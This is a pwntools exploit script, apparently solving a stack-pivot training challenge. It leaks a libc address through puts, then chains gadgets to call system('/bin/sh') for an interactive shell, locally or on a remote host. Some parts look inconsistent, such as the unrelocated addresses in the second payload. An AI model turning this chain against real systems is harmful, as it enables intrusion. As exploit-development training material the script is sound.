from pwn import *

"""
Sources:
https://bananamafia.dev/post/binary-rop-stackpivot/
"""

"""
Run locally with:
./exploit.py LOCAL
Run against remote with:
./exploit.py HOST=x.x.x.x PORT=xxxxx
"""

splash()
elf = context.binary = ELF("./pivot")
lib = ELF("./libpivot.so", checksec=False)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)


class ROP_Gadget:
    xchg = 0x00000000004009bd
    pop_rax = 0x00000000004009bb
    foothold_i = 0x0000000000400720
    foothold_plt = elf.plt["foothold_function"]
    foothold_got = elf.got["foothold_function"]
    rtw_offset = lib.symbols["ret2win"] - lib.symbols["foothold_function"]
    pop_rbp = 0x00000000004007c8
    add_rax_rbp = 0x00000000004009c4
    deref_eax = 0x00000000004009c0 # mov eax, dword ptr [rax]; ret
    call_rax = 0x00000000004006b0
    puts_got = elf.got["puts"]
    puts_plt = elf.plt["puts"]
    sys_offset = libc.symbols["system"] - libc.symbols["puts"]
    pwnme = elf.symbols["pwnme"]
    main = elf.symbols["main"]
    pop_rdi = 0x0000000000400a33
    ret = 0x00000000004006b6
    bin_sh = next(libc.search(b"/bin/sh"))
    system = libc.sym["system"]
    sys_exit = libc.sym["exit"]
    zero = 0x0000000000000000


def conn():
    if args.LOCAL:
        pty = process.PTY
        return process(elf.path, stdin=pty, stdout=pty, stderr=pty)
    else:
        return remote(args.HOST, args.PORT)

def solve():
    io = conn()

    padding = cyclic(40)
    input("PAUSE...")

    io.recvuntil(b"pivot: ")
    pivot_str = io.recvuntil(b"\n")
    pivot_addr = int(pivot_str, 16)

    log.info("Pivot address: {}".format(hex(pivot_addr)))

    stager = [
        padding,
        ROP_Gadget.pop_rax,
        pivot_addr,
        ROP_Gadget.xchg
    ]

    payload_1 = [
        ROP_Gadget.pop_rdi,
        ROP_Gadget.puts_got,
        ROP_Gadget.puts_plt,
        ROP_Gadget.pop_rdi,
        pivot_addr+100,
        ROP_Gadget.ret,
        ROP_Gadget.pwnme
    ]

    io.sendline(flat(payload_1))
    io.recvuntil(b"smash\n")
    io.sendline(flat(stager))
    io.recvuntil(b"Thank you!\n")

    recvieved = io.recvline().strip()
    log.info("String check: {}".format(recvieved))
    leak = u64(recvieved.ljust(8, b"\x00"))
    log.info("Leaked libc address {}: {}".format("puts", hex(leak)))

    libc.address = leak - libc.symbols["puts"]
    log.info("Libc base addr: {}".format(hex(libc.address)))

    io.recvuntil(b"pivot: ")
    pivot_str_2 = io.recvuntil(b"\n")
    pivot_addr_2 = int(pivot_str_2, 16) + 1000

    log.info("Pivot address 2: {}".format(hex(pivot_addr_2)))

    log.info("bin/sh %s " % hex(libc.address + ROP_Gadget.bin_sh))
    log.info("system %s " % hex(libc.address + ROP_Gadget.system))


    stager_2 = [
        padding,
        ROP_Gadget.pop_rdi,
        libc.address + ROP_Gadget.bin_sh,
        libc.address + ROP_Gadget.system
    ]

    payload_2 = [
        ROP_Gadget.pop_rdi,
        ROP_Gadget.bin_sh,
        ROP_Gadget.system,
        ROP_Gadget.pop_rdi,
        ROP_Gadget.zero,
        ROP_Gadget.sys_exit
    ]

    log.info(io.recvuntilS(b"> "))
    io.sendline(flat(payload_2))
    log.info(io.recvuntilS(b"> "))
    io.sendline(flat(stager_2))

    io.interactive()


if __name__ == "__main__":
    solve()